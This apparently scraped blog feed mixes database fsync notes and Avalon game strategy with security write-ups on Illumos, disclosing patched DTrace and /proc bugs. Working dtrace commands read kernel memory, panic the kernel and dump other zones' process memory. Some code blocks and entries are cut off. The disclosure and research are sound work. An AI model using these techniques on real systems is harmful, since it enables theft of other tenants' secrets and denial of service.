    <content type="html"><![CDATA[<p>Since the <a href="http://benmmurphy.github.com/blog/2018/06/01/fsync-db-lock-contention/">last post</a> on fsync and
non-durable reads we have had a play around with VoltDB too see if our
speculation with how synchronous command logging works would be consistent
with it&rsquo;s performance.</p>

<p>The first thing we noticed is that read-only transactions wait for the log
interval even if there are no previous write transactions waiting for their
command log to be synced to disk. You can observe this by setting log frequency
to 5000ms (the maximum) and using synchronous logging. Then if you run an
ad-hoc select statement from sqlcmd you will notice that it sometimes takes
the full 5 seconds to return a result. It is important to note read-only
transaction will not wait for a disc sync if there is only read only transactions
in the command log buffer. But even without the sync some read only transactions
will be unecessarily be delayed because they wait for the command log to be
flushed. I have a LD_PRELOAD module that would delay
synchronization by 1 second and I never observed a read-only transaction taking
more than 5 seconds to return a result. However, if there are write transactions
in the buffer then the read-only transaction will wait for the command log to be
synchronised (presumably the data from the read-only transaction isn&rsquo;t actually
written). This waiting for previous write transactions to sync to disk prevents
the non-durable read problem discussed in the previous post.</p>

<p>It is kind of weird that VoltDB unecessarily stalls some read transactions but
this is probably not a big deal with real workloads because frequency will be
set to 1ms and most workloads are a mix of read and writes and writes will
always cause the command log to be synchronised.</p>

<p>Here are some links from VoltDB that explain how command logging
<a href="https://docs.voltdb.com/UsingVoltDB/ChapCmdLog.php">works</a> and can be
<a href="https://docs.voltdb.com/UsingVoltDB/CmdLogConfig.php">configured for optimal performance</a>.</p>

    <link href="http://benmmurphy.github.com/blog/2018/06/01/fsync-db-lock-contention/"/>
    <updated>2018-06-01T19:46:30+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2018/06/01/fsync-db-lock-contention</id>
    <content type="html"><![CDATA[<p>Lets say you have a table in a database that you are using to keep track of a
counter value. So something like:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Column |  Type   | Modifiers
</span><span class='line'>--------+---------+-----------
</span><span class='line'> id     | integer | not null
</span><span class='line'> count  | integer | not null
</span><span class='line'>Indexes:
</span><span class='line'>    "test_pkey" PRIMARY KEY, btree (id)</span></code></pre></td></tr></table></div></figure>


<p>If you have lots of connections updating values doing the query: <code>update
test set count = count + 1 where id = $1;</code> then on postgresql you should have
very decent performance as long as the id values do not overlap too much. Even
though postgresql needs to fsync the WAL to disk for each commit it is able to
amortise the cost of this over many commits if the commits start to queue up
because fsyncing is slow. For example the WAL fsyncs might be something like:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 2
</span><span class='line'>update test set count = count + 1 where id = 3
</span><span class='line'>..
</span><span class='line'>update test set count = count + 1 where id = 100
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 101
</span><span class='line'>update test set count = count + 1 where id = 102
</span><span class='line'>..
</span><span class='line'>update test set count = count + 1 where id = 200
</span><span class='line'>FSYNC WAL</span></code></pre></td></tr></table></div></figure>


<p>However, if the id values overlap and in the worst case if they are all the same
then not only do you have a problem with lock contention but you also have a
problem with serializing all of the fsyncs. Postgresql and presumably any sane
RDBMS will hold a write lock on the updated records until the transaction is
durable. So you end up getting all the WAL fsyncs done in a completely serial
order.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL</span></code></pre></td></tr></table></div></figure>


<p>Before the land of SSDs this would be absolutely horrible. If you are paying
6ms for a fsync then it completely destroys your throughput (166 fsync/s). But
now with SSDs (or previously with battery backed caches) the fsync cost is much
lower so this is less of an issue. For example with Amazon EBS I see fsync cost
of around 0.5ms (2000 fsync/s) and i3 NVME performance of ~0.05ms
(20000 fsync/s).</p>

<p>Is it possible for an RDBMs to fix this fsync problem? So when you think about
it an RDBMs could drop all the locks a transaction has once it has decided that
nothing except for the WAL fsync would prevent it from committing. This would
kind of work because another transaction that would modify the same row would
be dependent on the previous WAL segments committing before it could commit.
However, this opens up a big consistency hole in the way clients interact
with the database. For example you could see this happening:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>TX1: BEGIN;
</span><span class='line'>TX1: insert into test(id) values(1);
</span><span class='line'>TX1: COMMIT;
</span><span class='line'>
</span><span class='line'>&lt;TX1 not fsync'd>
</span><span class='line'>
</span><span class='line'>TX2: BEGIN;
</span><span class='line'>TX2: insert into test(id) values(1);
</span><span class='line'>
</span><span class='line'>&lt;instead of blocking here for TX1 to commit it raises unique error>
</span><span class='line'>
</span><span class='line'>DB: POWER FAILURE &lt;TX1 is never committed></span></code></pre></td></tr></table></div></figure>


<p>Here we see a case where the second transaction observes data in the database
that was not durable. It might think that because the record is already in
the database it can do something else with an external system and then we end
up having a problem. This particular case is also weird because the transaction
gets in a state where it can&rsquo;t be committed. If you successfully commit a
transaction that has touched non-durable records then all the reads are safe
because the records would now be durable after the commit. But a transaction
with an error is not committable so you would also need to add a weird hook
where a rollback (or implicit rollback) might have to wait for other
transactions to fsync before returning to the client.</p>

<p>Also, transactions that did not modify data would normally have a no-op commit
but if they were shown non-durable records they would need to potentially wait
to commit.</p>

<p>Basically, it could kind of work as long as all transactions waited for a
successful commit/rollback before acting on any data they read from the DB
but this does not seem realistic.</p>

<p>If you look at VoltDB it looks like they only let you do transactions inside
stored procedures. I&rsquo;ve also seen a comment along the lines that they do batch
commits. Considering, they are single threaded presumably they handle a bunch
of transactions on the thread and add them to a queue that is fsynced in batches
then the results from the stored procedures are sent back to the client. This
presumably removes any of the consistency problems you have from a system
that has external transactions where non-durable reads can escape.</p>

<p>If you want to play around with postgresql to see what effects wal fsync delay
has I have a LD_PRELOAD library that will add 10s to every fsync.

    <link href="http://benmmurphy.github.com/blog/2017/08/08/mechanically-solving-avalon/"/>
    <updated>2017-08-08T21:48:48+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2017/08/08/mechanically-solving-avalon</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been thinking for a while if it is possible for the &lsquo;good&rsquo; team in Avalon to follow some optimal strategy that would always achieve victory. To simplify things this post will focus on finding an optimal strategy for 5 person Avalon when the Merlin(Commander) and the Assassin are both in play. It is important to note in this variant the &lsquo;good&rsquo; team at best can only win on average 2/3 of games because the &lsquo;evil&rsquo; team can always randomly pick the Merlin at the end of the game and will guess correctly 1 in 3 times. This question has also been answered before on <a href="https://boardgames.stackexchange.com/questions/20476/solution-to-avalon-board-game">stackexchange</a> but we will try and answer it without crypto. But we will use something very similar to crypto and similar strategies so I&rsquo;m not sure if we are adding anything useful.</p>

<p>The 5 person Avalon game is interesting because there are only 2 &lsquo;evil&rsquo; and 3 &lsquo;good&rsquo; people. This creates an easy mechanism to solve the game.</p>

<ol>
<li><p>After the game has been setup everyone secretly writes down a list of people they know are good. Merlin writes down the people who knows are good. Other good people pretend to write down a list of people but instead write gibberish.</p></li>
<li><p>The lists are shuffled.</p></li>
<li><p>There will be either 1, 2 or 3 non-gibberish lists depending on what the &lsquo;evil&rsquo; people do.</p></li>
<li><p>If there is 1 non-gibberish list the &lsquo;good&rsquo; teams wins by just following the list because this is Merlin&rsquo;s list.</p></li>
<li><p>If there is 2 or 3 non-gibberish lists then follow one list until it fails then switch to the other list. It is only possible for at most 2 missions to fail because after a list fails it is no longer used to pick teams. If only 2 missions fail then 3 missions succeed and the good team wins.</p></li>
</ol>


<p>The strategy also shows why the Assassin is so important in the 5 player variant. Because without the Assassin the Commander could just announce themselves and even if the evil team optimally bluffed and impersonated the Commander themselves they would still be guaranteed to lose.</p>

<p>This strategy only works when there are 2 &lsquo;evil&rsquo; players so only in the 5 and 6 player variants. Once a third &lsquo;evil&rsquo; player is introduced it is possible to fail 3 missions using 3 evil lists.</p>

<p>Can we solve 7+ player games using this strategy?</p>

<p>If we have 3 evil players then we need to eliminate a list initially or run a mission that will eliminate two lists instead of one.</p>

<p>Unlike the stackexchange solution we don&rsquo;t have a way to identify the author of a list so some of the strategies for eliminating lists do not work. However, we can still:</p>

<ol>
<li><p>If a mission fails then any list that contains all the members of the failing mission is also a bad list.</p></li>
<li><p>If a mission fails and none of the members of the failing mission is in the compliment of a list then this list is a bad list.</p></li>
<li><p>Any members common to all lists are good.</p></li>
</ol>


<p>To test whether evil players have a winning strategy it should be possible to brute force all the combinations of evil lists: 7C4<sup>3</sup> + 7C4<sup>2</sup> + 7C4 => 44135 and see if any of them can&rsquo;t be solved by an optimal good team.</p>

    <id>http://benmmurphy.github.com/blog/2017/08/08/avalon-fonix-slash-grabyo-meta-snapshot</id>
    <content type="html"><![CDATA[<p>For those that don&rsquo;t know <a href="https://boardgamegeek.com/boardgame/128882/resistance-avalon">Avalon</a> (or <a href="https://boardgamegeek.com/boardgame/41114/resistance">The Resistance</a>) is a board game where a &lsquo;good&rsquo; team which consist of the majority of players attempt to pass 3 missions while an &lsquo;evil&rsquo; team which consist of a minority of the players try to sabotage them. The &lsquo;evil&rsquo; team achieves this objective by convincing the other players to put them on missions and then failing the missions. The &lsquo;evil&rsquo; team is in a better position to do this because they know who all the other &lsquo;evil&rsquo; players are and can coordinate their voting or influence discussions to achieve their objective. On the other hand the &lsquo;good&rsquo; team is generally in the dark about the identity of the other players except for a few important exceptions.</p>

<p>We generally play 10 players with the Commander (Merlin), Bodyguard (Percival), Deep Cover (Mordred) and False Commander (Morgana) characters. The Commander knows who all the evil characters are except for Deep Cover. The Bodyguard knows who the Commander and False Commander is but doesn&rsquo;t know which is which. We also use the Lady of the Lake which allows its holder after the second round to find out which team another play is on privately. The person being interrogtated cannot lie but the person receiving the information can lie or tell the truth to the rest of the table. The Lady of the Lake token then passes to the player that was interrogated and they get an opportuntity to use it on the next round and so forth. We also sometimes play only vanilla resistance without characters but with plot cards.</p>

<p>Because we play a lot with each other some interesting behaviour has emerged. Firstly, we have a house technique which allows multiple evil players to coordinate failing a mission. For example in a 3 player mission with two evil players it would be a disaster if both evil players put in a fail card. So it has evolved that the person who proposed the mission or the first evil player clockwise (the first evil player to pick the next mission) from the person who proposed the mission is responsible for failing the mission. This removes a lot of deductive ability from the good team because it is difficult to assume that there is only 1 evil player in a mission if it fails.</p>

<p>We have also noticed that a lot of missions in the first round will be forced to the last pick because in the ten player games it is very difficult to get 6 good people (all the good people) to coordinate on picking a team. So generally the only way a mission passes before the last pick in the first round is because of evil shenanigans so good people are wary of voting for a team they are not on. This often means the position of the players has a large effect on the outcome of the game.</p>

<p>A lot of the games lately are being won by the good team but then the win is being overturned by the assassin. In the latest game the Assassin was not picked because they provided the most useful information to the table, they actually did very little, but rather because they made no incorrect statements. The evil team is often very focused on finding the Commander even to the detriment of getting a clean win.</p>

    <content type="html"><![CDATA[<p>For some background check John Regehr&rsquo;s <a href="http://blog.regehr.org/archives/887">excellent post</a> on the history of problems caused by dividing INT_MIN by -1. DTrace is an interpreter that runs inside the kernel on both Illumos and OSX. Before it was <a href="https://github.com/joyent/illumos-joyent/commit/8a5ff7873220bd2725876b6ef7fdd2bceff60dd3">patched</a> in Illumos it was possible to create an expression to divide INT_MIN by -1 and this would cause the kernel to crash.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>This is still an issue in OSX. I emailed them a month ago along with links to other DTrace issues that have been fixed in Illumos and not OSX and haven&rsquo;t heard back. Since this is not really a security issue I&rsquo;m posting it here. You need root in order to trigger the DTrace division by zero and if you have root you can already reboot the machine :/. You also need root to trigger all of the other issues.</p>

    <id>http://benmmurphy.github.com/blog/2017/01/31/local-privilege-escalation-in-illumos-via-slash-proc</id>
    <content type="html"><![CDATA[<p>The /proc permissions in Illumos were optional. I&rsquo;m not sure how long this has been an issue but looking at the <a href="https://github.com/joyent/illumos-joyent/commits/fee52838cd1191a3efe83b67de7bccdd401af35e/usr/src/uts/common/fs/proc/prvnops.c">history</a> of the files associated with the permission check I could not find where the problem was introduced. I checked if this was also an issue in Solaris but this had been fixed in Solaris. However, I could not find the CVE associated with this fix. My suspicion is that this has been an issue prior to the Illumos fork and was found by Solaris engineers and fixed in Solaris but not fixed in Illumos.</p>

<p>I found this vulnerability when I was looking for a RBAC bypass. RBAC in Solaris lets you have different named privileges associated with each process. It is possible for a process with a lot of privileges to drop most of them and keep only the ones that it needs. I thought it might be possible for a low privilege process to use /proc to debug a process owned by the same user that had higher privileges. This was because I thought the filesystem permissions would be the only permission check that would be performed. But if I would have checked the <a href="https://docs.oracle.com/cd/E23824_01/html/821-1473/proc-4.html">man page</a> I would have seen:</p>

<blockquote><p>EPERM</p><p><br/>An attempt was made to control a process of which the E, P, and I privilege sets were not a subset of the effective set of the controlling process or the limit set of the controlling process is not a superset of limit set of the controlled process.</p></blockquote>


<p>But I didn&rsquo;t check the man page and just tried to write to a /proc file of a higher privileged process using bash.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "wat" &gt; /proc/23912/lwp/1/lwpctl</span></code></pre></td></tr></table></div></figure>


<p>Which instead of giving a permission error gave back an I/O error.</p>

<p>This issue can be demonstrated via the following commands:</p>

<p>First we drop the sys_mount permission which will prevent us from opening proc on our
parent bash process because we have a subset of permissions.</p>

<p>Next, we try and open the parent process lwpctl and it correctly fails.</p>

<p>In Illumos there is the concept of a VNode which is contains a bunch of pointers to methods that are used by the kernel to interact with the filesystem. When a file is opened the kernel will call a <code>#access</code> method on the VNode first and then will call the open method on the VNode if it the <code>#access</code> succeeds. However, in the case when O_CREAT is passed the kernel will only call the #create method and it will assume the <code>#create</code> method will also call the <code>#access</code> method. In the case of the /proc file system this was not happening so anybody could pass in O_CREAT and no permission check would occur so the open would always succeed. Since there is no other checks not only does this work as an RBAC bypass it always works as a privilege escalation from non-root to root. It is important to note that Zone&rsquo;s contain this issue and it doesn&rsquo;t seem possible to use this as a way of escalating your privileges outside of a Zone.</p>

<p>If you look at the <a href="https://github.com/joyent/illumos-joyent/commit/fee52838cd1191a3efe83b67de7bccdd401af35e">patch</a> you can see a call to <code>#praccess</code> was added and some other checks as well that I don&rsquo;t understand.</p>

<p>I notified Joyent about this on the 14th of Decemeber and they had a fix commited by the 17th. The advisory from Joyent is available <a href="https://help.joyent.com/hc/en-us/articles/115002310368-Security-Advisory-proc-Filesystem-Permission-Vulnerability">here</a>. The Joyent people are probably quietly cheering on the demise of Solaris because as you can see from this vulnerability security issues might be fixed in Solaris while still being vulnerable in Illumos. One way of looking at this is that Oracle is selling a zero day exploit feed for Joyent&rsquo;s public cloud. Though, it is probably not that bad because the code bases have diverged a bit.</p>

<h1>Exploit</h1>

<p>I have an <a href="https://github.com/benmmurphy/illumos_playground/tree/master/proc_escalation">exploit</a> for this that will use the lwp_agent to create a file <code>/tmp/elevator</code> that is suid root. It also uses the <code>lwp_agent</code> to write a program to this file that contains:</p>

    <updated>2017-01-06T21:02:05+00:00</updated>
    <id>http://benmmurphy.github.com/blog/2017/01/06/arbitrary-kernel-memory-reads-on-illumos</id>
    <content type="html"><![CDATA[<p>Illumos is the name of the operating system that was forked from OpenSolaris and is being used to power Joyent&rsquo;s <a href="https://www.joyent.com/triton">Triton</a> cloud platform. Joyent have their own branded version of Illumos called SmartOS. Joyent&rsquo;s cloud is interesting because they offer hosting using Zones where customers share the same kernel. This is in contrast to traditional cloud providers who provide isolation between customers using virtual machines. However, it seems that kernel provided isolation is becoming more popular. Looking at AWS Lambda it appears that Linux kernel namespaces are being used to provide isolation. Because the kernel is used to provide isolation it means the whole of the kernel becomes an attack surface. This is especially interesting in the case of Illumos because Illumos runs an interpreter inside the kernel called DTrace which is one of the big selling points of Triton.</p>

<p>DTrace is an incredibly complex piece of code and it consists of more than 17k lines of C code. It is very difficult to write this amount of C code without introducing lots of bugs :( During my review of the DTrace source code I stumbled across two integer overflows and an out of bound read that could be converted to arbitrary kernel writes. I also found five bugs that could be used for arbitrary memory reads. I find exploitation of these arbitrary memory reads more interesting than the privilege escalation bugs so I&rsquo;m going to write about four of these first. I intend to write up the other bugs but these were disclosed starting from September 2015 so don&rsquo;t hold your breath.</p>

<h1>DTrace Copy Out</h1>

<p>If you look at the <a href="http://docs.oracle.com/cd/E19253-01/819-5488/gcfsd/">DTrace user guide</a> it has this definition for the <code>copyout</code> function:</p>

<blockquote><p>void copyout(void *buf, uintptr_t addr, size_t nbytes)`</p><p>The `copyout()` action copies data from a buffer to an address in memory. The number of bytes that this action copies is specified in nbytes. The buffer that the data is copied from is specified in buf. The address that the data is copied to is specified in addr. That address is in the address space of the process that is associated with the current thread.</p></blockquote>


<p>When you call <code>copyout</code> <a href="https://github.com/joyent/illumos-joyent/blob/20150820/usr/src/uts/common/dtrace/dtrace.c#L4174">this code</a> is run by DTrace:</p>

<pre><code>case DIF_SUBR_COPYOUT: {
  uintptr_t kaddr = tupregs[0].dttk_value;
  uintptr_t uaddr = tupregs[1].dttk_value;
  uint64_t size = tupregs[2].dttk_value;

  if (!dtrace_destructive_disallow &amp;&amp;
      dtrace_priv_proc_control(state, mstate) &amp;&amp;
      !dtrace_istoxic(kaddr, size)) {
    DTRACE_CPUFLAG_SET(CPU_DTRACE_NOFAULT);
    dtrace_copyout(kaddr, uaddr, size, flags);
    DTRACE_CPUFLAG_CLEAR(CPU_DTRACE_NOFAULT);
  }
  break;
}
</code></pre>

<p>Unfortunately, <code>copyout</code> does exactly what it says on the tin. It copies out kernel memory into userspace without any checks :(. The <code>kaddr</code> and <code>size</code> values are completely controlled by the user. If we check the rest of the call path there is no code that checks that the user is allowed access to the range specified by <code>kaddr</code> and <code>size</code>. In fact, there is a function specifically designed to check this called <code>dtrace_canload</code> but this was not used. <a href="https://github.com/joyent/illumos-joyent/commit/395c7a3dcfc66b8b671dc4b3c4a2f0ca26449922#diff-64e6f1587817235d06f7d2db19a97967R4186">The patch</a> fixes this issue by adding a <code>dtrace_canload</code> check:</p>

<pre><code>  if (!dtrace_destructive_disallow &amp;&amp;
        dtrace_priv_proc_control(state, mstate) &amp;&amp;
-        !dtrace_istoxic(kaddr, size)) {
+        !dtrace_istoxic(kaddr, size) &amp;&amp;
+        dtrace_canload(kaddr, size, mstate, vstate)) {
</code></pre>

<h1>Exploiting Arbitrary Memory Reads</h1>

<p>At first glance there doesn&rsquo;t seem to be that much interesting stuff in Illumos to read from kernel memory. Illumos doesn&rsquo;t have KASLR so you can&rsquo;t use an arbitrary memory to discover where stuff is mapped in to bypass KASLR. It should be possible to dump the filesystem buffer cache or even kernel SLABs used for syscall args which could hold sensitive information from other processes on the system but I didn&rsquo;t persue this option.</p>

<p>It would be great if you could dump memory from other processes but this is not possible on x86 because only the currently running process and the kernel are mapped into memory. However, luckily for us Illumos 64bit maps all the physical memory at a known address in the kernel&rsquo;s virtual address space. I think this is done to make it easier to set up page tables. So all you have to do to read the memory from another process is convert the virtual address you want to read to a physical address and then just add this physical address to the kernel physical address offset (<code>kpm_vbase</code>). This is all possible because the information to do this is inside the kernels memory and we have an arbitrary kernel memory read. The location of all these static locations like <code>kpm_vbase</code> are also helpfully exported by the kernel (they are not really secret anyway because no KASLR) and can be accessed using a library called libctf. That doesn&rsquo;t stand for lib capture the flag :(</p>

<p>We can also get a list of all the running processes from the <code>practive</code> linked list. Normally when you are inside a Zone you can only see processes inside your own Zone. This allows us to create a tool that can be plugged in with an arbitrary kernel memory read and provide us with a ps that will dump all the processes running on the system and allow us to dump the memory contained in these processes.</p>

<p>Here is an example session with the tool being used to dump the heap from a vim process running in the global zone:</p>

<pre><code>./global_ps

PID COMMAND PSARGS BRKBASE
8024 global_ps ./global_ps 0x414b90
8015 vim vim secret.txt 0x81f8be8

./global_ps segment -p 8015

ADDRESS SIZE FLAGS
0xfec2f000 4096
0x81ef000 188416 [heap]

./global_ps dump -p 8015 -a 0x81ef000 -s 188416 &gt; dump
</code></pre>

<p>In a shared system this can be very dangerous because you can read private keys, and authentication information from other processes. It also shows that relatively benign vulnerabilities can be very serious on systems that are used for shared hosting.</p>

<h1>DTrace INET_NTOA</h1>

<p>This is a similar issue to the <code>copyout</code> problem. This is what the <a href="https://docs.oracle.com/cd/E36784_01/html/E36846/gkwzy.html">DTrace user guide</a> has to say about <code>inet_nota</code></p>

<blockquote><p>string inet_ntoa(ipaddr_t *addr)</p><p>    inet_ntoa takes a pointer to an IPv4 address and returns it as a dotted quad decimal string. This is similar to inet_ntoa() from libnsl as described in inet(3SOCKET), however this D version takes a pointer to the IPv4 address rather than the address itself. The returned string is allocated out of scratch memory, and is therefore valid only for the duration of the clause. If insufficient scratch space is available, inet_ntoa does not execute and an error is generated.</p></blockquote>


<p>The <a href="https://github.com/joyent/illumos-joyent/blob/eef9c9737ad811523f9628507a5a0225058634bf/usr/src/uts/common/dtrace/dtrace.c#L5334">code</a> for the <code>inet_ntoa</code> function does not do any checking to see if the <code>addr</code> is allowed to be accessed.</p>

<pre><code>case DIF_SUBR_INET_NTOA:
case DIF_SUBR_INET_NTOA6:
case DIF_SUBR_INET_NTOP: {
  size_t size;
  int af, argi, i;
  char *base, *end;

  if (subr == DIF_SUBR_INET_NTOP) {
    af = (int)tupregs[0].dttk_value;
    argi = 1;
  } else {
    af = subr == DIF_SUBR_INET_NTOA ? AF_INET: AF_INET6;
    argi = 0;
  }

  if (af == AF_INET) {
    ipaddr_t ip4;
    uint8_t *ptr8, val;

    /*
     * Safely load the IPv4 address.
     */
    ip4 = dtrace_load32(tupregs[argi].dttk_value);
</code></pre>

<p>The <code>tupregs[argi].dttk_value</code> value can be controlled by the user and there is no call to <code>dtrace_canload</code>. This comment about &lsquo;Safely&rsquo; is misleading in this context because <code>dtrace_load32</code> prevents the kernel from panicing on a bad load and prevents access to memory mapped IO regions. So by using <code>inet_ntoa</code> we can read 4 bytes of arbitrary kernel memory. We just need to parse the dotted IP address back to bytes.</p>

<p>This bug is interesting because it can be demonstrated from the command line.</p>

<pre><code>&gt;  dtrace -n 'BEGIN{ print(inet_ntoa((in_addr_t*)&amp;`_mmu_pagemask))}'
dtrace: description 'BEGIN' matched 1 probe
CPU     ID                    FUNCTION:NAME
  0      1                           :BEGIN string "0.240.255.255"
</code></pre>

<p>From the global zone we can verify it has read the 4 bytes 0x00f0ffff</p>

<pre><code>&gt; echo '_mmu_pagemask::dump'| mdb -k
                    0 1 2 3  4 5 6 7 \/ 9 a b  c d e f  01234567v9abcdef
fffffffffb94a1d0:  ff0f0000 00000000 00f0ffff ffffffff  ................
</code></pre>

<p>We can plug this vulnerability into our framework and use it to list processes and dump their memory contents. You might be concerned that reading 4 bytes at a time is slow but there is no noticable delay when listing processes.</p>

<h1>DTrace Hash Corruption</h1>

<p>DTrace has support for hashmaps and allows the user to access the data in the hashmap using the store and load instructions. DTrace tries to separate the metadata from the data and only allow the user to modify the data. However, it is possible to modify the metadata and this allows an attacker to create a memory oracle. An attacker can choose an address and an array of bytes and check whether the memory at that address is equal to the array of bytes. This is equivalent to a slow arbitrary memory read because you can check a single byte 256 times to read a single byte of memory.</p>

<p>In <code>dtrace_canstore</code> it checks that the offset into the hash chunk is greater
than the size of <code>dtrace_dynvar_t.</code></p>

<p><a href="https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L679">https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L679</a></p>

<pre><code>chunkoffs = (addr - base) % dstate-&gt;dtds_chunksize;

if (chunkoffs &lt; sizeof (dtrace_dynvar_t))
  return (0);
</code></pre>

<p>Presumably, it is doing this to prevent the user from writing to the metadata
in the hash chunk and the author believed all the metadata is contained in the
<code>dtrace_dynvar_t</code> structure. This belief is true but <code>dtrace_dynvar_t</code> is a
dynamically sized structure with the embedded structure <code>dtrace_tuple</code>
containing a dynamically sized array of <code>dtrace_key</code> structures.</p>

<pre><code>typedef struct dtrace_dynvar {
  uint64_t dtdv_hashval;      /* hash value -- 0 if free */
  struct dtrace_dynvar *dtdv_next;  /* next on list or hash chain */
  void *dtdv_data;      /* pointer to data */
  dtrace_tuple_t dtdv_tuple;    /* tuple key */
} dtrace_dynvar_t;

typedef struct dtrace_tuple {
  uint32_t dtt_nkeys;     /* number of keys in tuple */
  uint32_t dtt_pad;     /* padding */
  dtrace_key_t dtt_key[1];    /* array of tuple keys */
} dtrace_tuple_t;

typedef struct dtrace_key {
  uint64_t dttk_value;      /* data value or data pointer */
  uint64_t dttk_size;     /* 0 if by-val, &gt;0 if by-ref */
} dtrace_key_t;
</code></pre>

<p>So if there is more than one key value then an attacker is able to write into
the key values beyond the first one. The <code>dttk_value</code> field is treated as
pointer if the <code>dttk_size</code> field is non-zero.</p>

<p>Unfortunately, the only place where <code>dttk_value</code> field seems to be used is as
an argument to the <code>dtrace_bcmp</code> function. When the hashmap looks up a value and
finds a matching entry based on the hash code it checks that the keys are equal
using the <code>dtrace_bcmp</code> function.</p>

<p><a href="https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L1791">https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L1791</a></p>

<pre><code>for (i = 0; i &lt; nkeys; i++, dkey++) {
  if (dkey-&gt;dttk_size != key[i].dttk_size)
    goto next; /* size or type mismatch */

  if (dkey-&gt;dttk_size != 0) {
    if (dtrace_bcmp(
        (void *)(uintptr_t)key[i].dttk_value,
        (void *)(uintptr_t)dkey-&gt;dttk_value,
        dkey-&gt;dttk_size))
      goto next;
  } else {
    if (dkey-&gt;dttk_value != key[i].dttk_value)
      goto next;
  }
}
</code></pre>

<p>So we don&rsquo;t have a direct read or write primitive but we can tell indirectly
if a piece of memory is identical to the value the <code>dttk_value</code> field points to.
We can do this by:</p>

<ol>
<li><p>Storing a value in the hash with two keys. A first dummy key and a second key
which is the the byte we want to check. ie:</p>

<pre><code>  buf[0] = 0xff; hash[1, buf] = "h"
</code></pre></li>
<li><p>We can find the address of the <code>dttk_value</code> field for second key by doing:</p>

<pre><code> addr = (&amp;hash[1, buf][0]) - 0x28
</code></pre>

<p> Example showing the address of the value:</p>

<pre><code> [root@web01 ~]# dtrace -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&amp;hash[1, buf][0]); print(addr)}'
 dtrace: description 'char buf[1]' matched 1 probe
 CPU     ID                    FUNCTION:NAME
   0      1                           :BEGIN char * 0xffffff00efa5c2d8
</code></pre>

<p> If you look at the memory layout in the kernel the address of the key is
 clearly 0x28 behind the value (0x68):</p>

<pre><code> 0xffffff00efa5c2d8-0x28,0x28::dump

                     \/

<li><p>We can change the pointer stored in the <code>dttk_value</code> field by doing:
<code>*(unsigned long*)addr = 0xdeadbeefdeadbeefL</code> and trigger a kernel panic by
looking up a value in the hash by doing <code>&amp;hash[1,buf][0]</code>.</p>

<pre><code>  [root@web01 ~]# dtrace -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&amp;hash[1, buf][0]) - 0x28; print(addr); *(unsigned long*)addr = 0xdeadbeefdeadbeefL; &amp;hash[1,buf][0]}'
  dtrace: description 'char buf[1]' matched 1 probe
</code></pre></li>
<li><p>We can turn this into a memory oracle by instead of putting a rubbish address
we put the address of a value we want to check and if we have dynvarsize=36 then
dtrace will only return a hash value if the byte at the address is equal to the
original <code>buf[0]=??</code> key. This is because the case where they are not equal
dtrace will try to allocate another chunk in the hash but there is no more
space for this chunk.</p></li>
</ol>


<p>Example where the byte mismatches <code>buf[0]=0xff</code>:</p>

<pre><code>[root@web01 ~]# dtrace -x dynvarsize=36 -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&amp;hash[1, buf][0]) - 0x28; *(void**)addr = &amp;`dtrace_dynhash_sink; print(&amp;hash[1,buf][0])}'
dtrace: description 'char buf[1]' matched 1 probe
dtrace: 1 dynamic variable drop
</code></pre>

<p>Example where the byte matches <code>buf[0]=0x1</code>:</p>

